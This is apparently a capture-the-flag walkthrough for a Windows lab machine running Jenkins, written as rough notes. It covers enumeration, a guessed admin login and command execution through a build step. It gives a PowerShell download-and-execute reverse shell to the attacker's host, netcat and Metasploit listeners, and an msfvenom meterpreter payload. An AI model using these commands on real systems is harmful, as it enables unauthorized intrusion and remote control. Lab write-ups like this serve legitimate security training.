# Alfred

## Concepts
- nmap
- gobuster
- Python web server
- Powershell

## Initial Enumeration
```
mkdir Alfred
cd Alfred
mkdir scans
export IP=10.10.226.95
export LHOST=10.6.73.147
nmap -sC -sV -Pn $IP -oN scans/normal
gobuster dir -u http://$IP:8080 -w /opt/tools/directory-list-2.3-medium.txt | tee scans/gobuster.log
```

### Alfred admin login
**http://10.10.226.95:8080** <br>
Crecentials
> **admin:admin**#Just guessed, terrible password

### Logic and attack
Jenkins is a CI and CD automation suite. In this case we have version 2.190.1 and we were lucky to have guessed the login credentials so easily, but even if that wasn't the case we could used other methods (like brute force) to log in.

Once in, explore around and see if there is anything interesting.

Because we are **admin** we can have access to everything, including creating New Items. When we create a new item, optionally we can execute a batch command in the server hosting the jenkins website after we have build our new item. Try any powershell valid command and see if you can check the output

Ok, we do get an output without errors, we have code execution, rest should be easy:
1 - Download any tool you want to get persistence and a better shell, this tool can (and should) already be in our attacking machine as one of our tools.

2 - The tool is probably going to call back to us, so we need to have a listener to catch the reverse shell (use meterpreter, pwncat, netcat etc)

3 - Win! You should have a shell with elevated priviledges, we can do whatever we want now. Get the flags

Get the exploit<br>
`wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1`

Serve it in a local web server<br>
`python3 -m http.server 8080`


In "http://10.10.226.95:8080/job/project/configure" at the bottom of the page there is a space where we have command execution, we can verify this by going to "http://10.10.226.95:8080/job/project/11/console" to verify the output of our commands
<screenshot1>
<screenshot2>

There we insert this command
On web:
```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.6.73.147:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.6.73.147 -Port 4444
```




Also create a listener for the port we the reverse shell is goint to call bakck<br>
`nc -lnvp 4444`

Go to the website and click the **"Build Now"** button and receive the reverse shield



On the powershell console, use the Get-ChildItem cmdlet with the -Recurse switch to find the flag<br>
```
Get-ChildItem -Filter *.txt -Recurse
cat c:\users\bruce\Desktop\user.txt
```
**79007a09481963edf2e1321abd9ae2a0**<br>

Lets escalate priviledges, first, create the meterpreter reverse shell payload<br>
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.73.147 LPORT=5555 -f exe -o meterpreter.exe
```

Serve it in a local web server<br>
`python3 -m http.server 8081`

Get it from the current Powershell session<br>
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.73.147:8081/meterpreter.exe','meterpreter.exe')"
```


Set up the listener withing metasploit<br>
```
use multi/handler
set PAYLOAD /windows/meterpreter/reverse_tcp
set LHOST 10.6.73.147
set LPORT 5555
run 
```

Execute the payload
```
Start-Process meterpreter.exe
```
get elevated

get persistence
9999
SetDebugPrivilege


type C:\Windows\System32\config\root.txt

